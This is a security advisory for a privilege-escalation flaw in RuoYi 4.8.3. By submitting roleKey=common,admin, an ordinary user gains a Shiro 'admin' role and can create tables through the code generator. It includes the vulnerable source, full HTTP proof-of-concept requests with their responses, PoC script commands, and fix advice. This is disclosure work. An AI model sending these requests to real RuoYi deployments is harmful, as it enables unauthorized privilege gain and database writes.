# RuoYi 4.8.3 Role Management roleKey Privilege Escalation Vulnerability

## NAME OF AFFECTED PRODUCT(S)

RuoYi (monolithic edition, Spring Boot + Apache Shiro)

## Vendor Homepage

https://ruoyi.vip

https://github.com/yangzongzhuan/RuoYi

## AFFECTED AND/OR FIXED VERSION(S)

Affected Version:

4.8.3

Tested commit: `7995a83e04e1a88aaea5a8a7c50570dffcb145e0` (`pom.xml` and startup banner both report `4.8.3`; the commit is untagged).

Fixed Version:

Unknown. No fix for comma-splitting of `roleKey` into reserved Shiro role names was present on the tested commit.

## Vuldb Submitter

Bob-wentao

## Vulnerable File

`ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysRoleController.java`

`ruoyi-system/src/main/java/com/ruoyi/system/service/impl/SysRoleServiceImpl.java`

`ruoyi-system/src/main/resources/mapper/system/SysRoleMapper.xml`

`ruoyi-framework/src/main/java/com/ruoyi/framework/shiro/realm/UserRealm.java`

`ruoyi-generator/src/main/java/com/ruoyi/generator/controller/GenController.java`

`ruoyi-generator/src/main/resources/mapper/generator/GenTableMapper.xml`

## Vulnerable Code

`SysRoleController.java` lines 165-179. `POST /system/role/authDataScope` binds the HTTP form into `SysRole` and persists it after only a role-ID check:

```java
@RequiresPermissions("system:role:edit")
@Log(title = "角色管理", businessType = BusinessType.UPDATE)
@PostMapping("/authDataScope")
@ResponseBody
public AjaxResult authDataScopeSave(SysRole role)
{
    roleService.checkRoleAllowed(role);
    roleService.checkRoleDataScope(role.getRoleId());
    role.setUpdateBy(getLoginName());
    if (roleService.authDataScope(role) > 0)
    {
        setSysUser(userService.selectUserById(getUserId()));
        return success();
    }
    return error();
}
```

`SysRoleServiceImpl.java` lines 315-320. `checkRoleAllowed` only rejects `roleId == 1`. It does not inspect the submitted `roleKey`, and it does not treat `admin` as a reserved token:

```java
if (StringUtils.isNotNull(role.getRoleId()) && role.isAdmin())
{
    throw new ServiceException("不允许操作超级管理员角色");
}
```

A request against ordinary role ID 2 still passes the data-scope check, because that role is already visible and editable by the caller.

`SysRoleServiceImpl.java` lines 213-223. `authDataScope` writes the unbound `roleKey` into the database:

```java
@Override
@Transactional
public int authDataScope(SysRole role)
{
    roleMapper.updateRole(role);
    roleDeptMapper.deleteRoleDeptByRoleId(role.getRoleId());
    return insertRoleDept(role);
}
```

`SysRoleMapper.xml` lines 95-107. The update statement accepts `roleKey` as supplied:

```xml
<update id="updateRole" parameterType="SysRole">
    update sys_role
    <set>
        <if test="roleKey != null and roleKey != ''">role_key = #{roleKey},</if>
        <if test="dataScope != null and dataScope != ''">data_scope = #{dataScope},</if>
        ...
    </set>
    where role_id = #{roleId}
</update>
```

The uniqueness check in the same mapper (lines 79-82) compares the full string `r.role_key = #{roleKey}`. Existing key `admin` therefore does not block `common,admin`.

`SysRoleServiceImpl.java` lines 68-79. Authorization later splits that string on commas and treats every token as a Shiro role:

```java
public Set<String> selectRoleKeys(Long userId)
{
    List<SysRole> perms = roleMapper.selectRolesByUserId(userId);
    Set<String> permsSet = new HashSet<>();
    for (SysRole perm : perms)
    {
        if (StringUtils.isNotNull(perm))
        {
            permsSet.addAll(Arrays.asList(perm.getRoleKey().trim().split(",")));
        }
    }
    return permsSet;
}
```

`UserRealm.java` lines 65-78. Those tokens are given to Shiro. Forging `admin` only enters the Shiro role set. It does not grant the `userId == 1` wildcard permission `*:*:*`:

```java
if (user.isAdmin())
{
    info.addRole("admin");
    info.addStringPermission("*:*:*");
}
else
{
    roles = roleService.selectRoleKeys(user.getUserId());
    menus = menuService.selectPermsByUserId(user.getUserId());
    info.setRoles(roles);
    info.setStringPermissions(menus);
}
```

`GenController.java` lines 195-221. The proven sink is an endpoint gated only by `@RequiresRoles("admin")`:

```java
@RequiresRoles("admin")
@Log(title = "创建表", businessType = BusinessType.OTHER)
@PostMapping("/createTable")
@ResponseBody
public AjaxResult create(String sql)
{
    try
    {
        SqlUtil.filterKeyword(sql);
        List<SQLStatement> sqlStatements = SQLUtils.parseStatements(sql, DbType.mysql);
        ...
        if (sqlStatement instanceof MySqlCreateTableStatement)
        {
            if (genTableService.createTable(createTableStatement.toString()))
            {
                ...
            }
        }
        ...
        genTableService.importGenTable(tableList, operName);
        return AjaxResult.success();
    }
    catch (Exception e)
    {
        return AjaxResult.error("创建表结构异常");
    }
}
```

`GenTableMapper.xml` lines 168-170. The generator then executes the CREATE TABLE statement against the application database:

```xml
<update id="createTable">
    ${sql}
</update>
```

The payload used here is a normal `CREATE TABLE` allowed by that feature. This report does not use a SQL-keyword filter bypass and does not treat historical SQL injection or generator RCE as the impact of this issue.

## VERSION(S)

4.8.3

Tested Commit:

`7995a83e04e1a88aaea5a8a7c50570dffcb145e0`

The commit message is `表格树删除通用请求方法改为POST`. At audit start, `git ls-remote origin refs/heads/master` recorded this SHA. All source, build, and runtime verification used this SHA. Product source was not modified.

## Software Link

https://github.com/yangzongzhuan/RuoYi

https://github.com/yangzongzhuan/RuoYi/commit/7995a83e04e1a88aaea5a8a7c50570dffcb145e0

https://github.com/yangzongzhuan/RuoYi/releases/tag/v4.8.3

## PROBLEM TYPE

Vulnerability Type:

Privilege Escalation

CWE:

CWE-863 (Incorrect Authorization)

CWE-269 (Improper Privilege Management)

## Root Cause

RuoYi stores a role permission key as an editable string, then splits that string on commas into Shiro roles. The role-edit path does not forbid an ordinary role from placing the reserved name `admin` inside `roleKey`, and uniqueness is checked on the raw full string rather than on the tokens that later become authorization identities.

The result is not binding the user to administrator role ID 1, and it is not forging user ID 1 wildcard permissions. It is a missing boundary between comma parsing of `roleKey` and reserved role names, so an ordinary role can mint a protected `admin` Shiro role token.

## Evidence and Reasoning

1. Source: authenticated ordinary user `ry` submits `POST /system/role/authDataScope` with `roleId=2` and `roleKey=common,admin`.
2. Transfer: Spring form binding writes the string into `SysRole.roleKey`. `authDataScope` calls `roleMapper.updateRole`, and `sys_role.role_key` becomes `common,admin`.
3. Transfer: on a fresh login, `selectRoleKeys` uses `split(",")` and produces Shiro roles `common` and `admin`.
4. Sink: `POST /tool/gen/createTable`, protected by `@RequiresRoles("admin")`, is allowed. `GenTableMapper.createTable` executes `CREATE TABLE` in the application MySQL database, and `gen_table` stores generator metadata for that table.

A control request with the same account, same endpoint, and a normal `CREATE TABLE` payload is denied before the `roleKey` mutation. After the mutation and a new login, the same request succeeds and the table appears. That isolates the trigger to the comma-injected `roleKey`.

## Impact

A low-privilege authenticated user can cross the `@RequiresRoles("admin")` boundary, create an attacker-chosen table in the application MySQL database, and leave generator metadata in `gen_table`.

This is unauthorized database-schema write and a role-protection bypass.

This report does not claim:

- that forging the role key grants `*:*:*` wildcard permissions;
- arbitrary table read, arbitrary SQL, remote command execution, or server takeover;
- that the default captcha is bypassed;
- that known SQL injection, generator RCE, or historical role-assignment issues are the root cause of this finding.

Those limits match the PoC output.

## Exploitation Prerequisites

- A valid low-privilege account is required. User ID 1 is not required. Direct database access is not required.
- The account must have `system:role:edit` and must pass data-scope checks for the target ordinary role. The repository init SQL already satisfies this: role 2 is `common`, user 2 `ry` is bound to role 2, and role 2 is linked to `system:role:edit` plus code-generation menus (`sql/ry_20260319.sql` lines 125-126, 193, 272-273, 289-373).
- The product uses Shiro role authorization by default. `/tool/gen/createTable` exists in product code and is protected by the `admin` role.
- Verification used local MySQL initialized from the bundled SQL. When captcha is enabled by default, the primary verification logged in through `/captcha/captchaImage?type=math`. The issue does not depend on captcha configuration.

## DESCRIPTION

RuoYi 4.8.3 (commit `7995a83e04e1a88aaea5a8a7c50570dffcb145e0`) lets an authenticated ordinary user change their own role key from `common` to `common,admin` through `POST /system/role/authDataScope`. After a new login, Shiro treats the user as having the `admin` role. That is enough to pass `@RequiresRoles("admin")` on `POST /tool/gen/createTable` and create a table in the live application database.

The issue is default-reachable with the bundled `ry` account. Local Docker verification reproduced the control denial, the role-key mutation, and the post-login DDL write. An independent child checkout of the same SHA reproduced the same result.

## Vulnerability Location:

`POST /system/role/authDataScope` parameter `roleKey`

Secondary / proven sink: `POST /tool/gen/createTable` (`@RequiresRoles("admin")`)

## Reproduction Steps

The runnable script is [`ruoyi-role-key-poc.sh`](./ruoyi-role-key-poc.sh). It:

1. Requires the checkout HEAD to equal the pinned SHA and builds the current-commit `ruoyi-admin` JAR with Maven.
2. Starts a fresh MySQL 8.0 container with `sql/ry_20260319.sql`.
3. Starts the real `ruoyi-admin` application container.
4. Logs in as `ry/admin123` and confirms that create-table is denied before the role-key change.
5. Changes the role key through the real `/system/role/authDataScope` endpoint.
6. Opens a new login session, calls the real `/tool/gen/createTable`, and queries MySQL for the table and `gen_table` metadata.
7. Deletes only the PoC-created table and metadata, then removes the temporary containers.

For unattended automation the script starts the app with `--shiro.user.captchaEnabled=false`. That is not an authorization bypass. The script still uses real login, real Shiro sessions, real controllers, and the real database. Primary verification was also completed with captcha enabled.

From a pinned checkout:

```bash
cd /workspace/RuoYi
REPO_DIR=/tmp/ruoyi-audit-7995 \
RUN_ID=script1 MYSQL_PORT=33310 APP_PORT=18090 \
./ruoyi-role-key-poc.sh
```

To prepare an independent checkout, fetch only this commit:

```bash
git clone https://github.com/yangzongzhuan/RuoYi.git /tmp/ruoyi-child-7995
git -C /tmp/ruoyi-child-7995 checkout --detach 7995a83e04e1a88aaea5a8a7c50570dffcb145e0
REPO_DIR=/tmp/ruoyi-child-7995 ./ruoyi-role-key-poc.sh
```

Images used:

```text
maven:3.9.9-eclipse-temurin-17
mysql:8.0
eclipse-temurin:17-jre
```

Build:

```text
docker run --rm -v /tmp/ruoyi-audit-7995:/workspace -w /workspace \
  maven:3.9.9-eclipse-temurin-17 mvn -B -DskipTests package
exit code: 0
BUILD SUCCESS
```

The application listened on `--server.port=18082`. MySQL listened on host-network port `33307`. An initial Docker-bridge attempt failed with MySQL `Communications link failure` and was not treated as a vulnerability result. Retrying with explicit host networking succeeded. That environment change did not modify product source.

## POC

Control request before forging the role key, after logging in as `ry`:

```http
POST /tool/gen/createTable
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<control-session>

sql=CREATE TABLE cve_rolekey_control_7995 (id INT PRIMARY KEY)
```

Observed: HTTP 200, HTML title `RuoYi - 403`, body contains `您没有访问权限！`. `information_schema.tables` count for that name is `0` before and after.

Mutation with the same ordinary account:

```http
POST /system/role/authDataScope
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<control-session>

roleId=2&roleKey=common%2Cadmin&dataScope=2&deptIds=100&deptIds=101&deptIds=105
```

Response:

```http
HTTP/1.1 200
Content-Type: application/json

{"msg":"操作成功","code":0}
```

Database:

```text
BEFORE: 2  common       2
AFTER:  2  common,admin 2
```

Initial users and roles from the bundled SQL:

```text
user_id login_name status del_flag
1       admin      0      0
2       ry         0      0

role_id role_key data_scope
1       admin    1
2       common   2
```

Discard the old session, log in again as `ry/admin123`, then:

```http
POST /tool/gen/createTable
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<fresh-session>

sql=CREATE TABLE cve_rolekey_poc_7995 (id INT PRIMARY KEY)
```

Observed:

```text
HTTP/1.1 200
{"msg":"操作成功","code":0}

information_schema.tables:
cve_rolekey_poc_7995

gen_table:
cve_rolekey_poc_7995    ry
```

Created table:

```sql
CREATE TABLE `cve_rolekey_poc_7995` (
  `id` int NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
```

After verification, `cve_rolekey_poc_7995` and its `gen_table` row were deleted. Product source was not modified.

Independent child-agent reproduction from a fresh remote checkout of the same SHA:

```text
checkout exit code: 0
HEAD: 7995a83e04e1a88aaea5a8a7c50570dffcb145e0
working tree: clean, detached HEAD
build exit code: 0
BUILD SUCCESS
PoC exit code: 0
CONTROL_CREATE_HTTP=200
CONTROL_TABLE_AFTER=0
ROLE_MUTATION_HTTP=200
MUTATED_ROLE=2    common,admin    2
ATTACK_CREATE_HTTP=200
ATTACK_TABLE_AFTER=cve_rolekey_poc_child7995
ATTACK_GENERATOR_ROW=cve_rolekey_poc_child7995    ry
CLEANUP_TABLE=0
POC_RESULT=PASS
```

The control response is HTTP 200 with title `RuoYi - 403`. The attack request is a real HTTP call on a new login session. The table and generator metadata both appear. The child agent did not modify product source.

Success condition: after `roleKey=common,admin` and a fresh login, `/tool/gen/createTable` returns `{"msg":"操作成功","code":0}` and the named table exists.

Failure condition: the same create-table request before the mutation is denied and the table does not exist.

## Benign Control

Same account, same `/tool/gen/createTable` endpoint, same `CREATE TABLE` request shape. Only the stored `roleKey` and the subsequent session change.

- Benign: `role_key=common`. Create-table returns the 403 page and the table count stays `0`.
- Malicious: `role_key=common,admin`, then a new login. Create-table returns `code:0` and the table plus `gen_table` row appear.

## Authentication and User Interaction

Authentication is required. The attacker must already have a low-privilege account that can edit an ordinary role (`system:role:edit` on the default `common` role). No victim click, file upload, or admin configuration change is required. This is not an unauthenticated remote issue.

## Historical Difference

Searches of RuoYi CVE/NVD, GHSA, Issues, PRs, related path history, and release notes were repeated before the candidate was locked, after primary Docker verification, and after the independent child Docker verification. Post-reproduction repository text search still returned:

```text
search/issues: repo:yangzongzhuan/RuoYi roleKey  -> total_count 0
search/commits: repo:yangzongzhuan/RuoYi role_key -> total_count 0
all PR title matches for roleKey/role key/role/authorization/permission/privilege -> []
```

Recent history on the related paths covers generic `isAdmin` unification and data-scope limits. It does not restrict comma-split role-key tokens to a reserved-name-safe set. No public open or merged PR described this `roleKey` injection path or the same root cause.

| Known item | Known five-dimension shape | Why this is not the same issue |
|---|---|---|
| [GHSA-h5jh-rp76-q242 / CVE-2024-57438](https://github.com/advisories/GHSA-h5jh-rp76-q242) | Low-privilege user binds a higher-privilege role ID to themselves through unsafe user-role assignment; older `4.8.0` and earlier | This path does not change `sys_user_role`, does not submit a role ID, and does not bind the user to role 1. It only changes role 2 `role_key`, then `split(",")` mints a Shiro `admin` token |
| [CVE-2025-56396](https://nvd.nist.gov/vuln/detail/CVE-2025-56396) | Privilege gain through department data scope | Input, root cause, and sink here are `roleKey` string parsing and `@RequiresRoles`, not department data-scope math |
| [Issue #328 / CVE-2026-37669](https://github.com/yangzongzhuan/RuoYi/issues/328) | `authDataScope` / `authUser` do not check whether submitted `deptIds` / `userIds` are inside the caller's data scope | The PoC uses `deptIds=100,101,105`, which the caller is already allowed to submit. The unauthorized field is `roleKey`. The effect is Shiro role authorization, not that issue's mapping sink |
| [Issue #300](https://github.com/yangzongzhuan/RuoYi/issues/300) | SQL-filter bypass / blind injection on `/tool/gen/createTable` | Before obtaining the role, the same endpoint's `@RequiresRoles("admin")` blocks the caller. After obtaining the role, the PoC submits a legal `CREATE TABLE` only. No filter bypass or data read is used |
| [Issue #205](https://github.com/yangzongzhuan/RuoYi/issues/205) | Code-generation field/path/restart chain to RCE, depending on generator management | This report does not use code injection, path, or restart, and does not treat RCE as proven impact. The new root cause is role-key minting |

Nearby role-management, data-scope, and code-generation topics therefore do not overlap on affected field, input vector, root cause, authorization transfer, and proven impact.

## Suggested Repair

Do not implement a product patch in this report repository. A correct fix should establish a role-identity model before handing keys to the authorization framework:

1. Reject comma injection, or store roles as a structured set instead of a split string.
2. Server-side reject reserved names such as `admin` on ordinary roles.
3. Enforce uniqueness on the final authorization tokens, not only on the raw full string.
4. Keep the existing checks for role ID 1 and role data scope as independent controls.
5. Add a regression test: a non-admin user must not persist `roleKey=common,admin`, and after login that user must still be denied `@RequiresRoles("admin")`.
